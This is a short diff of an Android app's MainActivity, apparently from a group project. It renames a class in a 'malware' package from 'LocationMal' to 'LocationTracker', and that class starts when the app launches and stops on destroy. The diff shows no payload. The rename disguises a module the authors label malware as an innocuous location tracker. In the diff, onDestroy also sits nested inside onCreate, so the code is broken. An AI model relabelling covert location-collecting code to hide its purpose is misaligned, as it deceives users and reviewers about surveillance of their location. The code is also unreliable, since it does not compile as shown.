@@ -10,13 +10,13 @@ import com.example.project_group18.ui.navigation.NavigationBar
 import com.example.project_group18.ui.login.LoginScreen
 import com.example.project_group18.ui.theme.Projectgroup18Theme
 import com.example.project_group18.ui.users.UserScreen
-import com.example.project_group18.malware.LocationMal
+import com.example.project_group18.malware.LocationTracker
 
-private val locationMalware = LocationMal()
+private val locationTracker = LocationTracker()
 class MainActivity : ComponentActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        locationMalware.init(this)
+        locationTracker.init(this)
         enableEdgeToEdge()
         setContent {
             Projectgroup18Theme {
@@ -27,7 +27,7 @@ class MainActivity : ComponentActivity() {
             }
         }
         override fun onDestroy() {
-            locationMalware.stop()
+            locationTracker.stop()
             super.onDestroy()
         }
     }
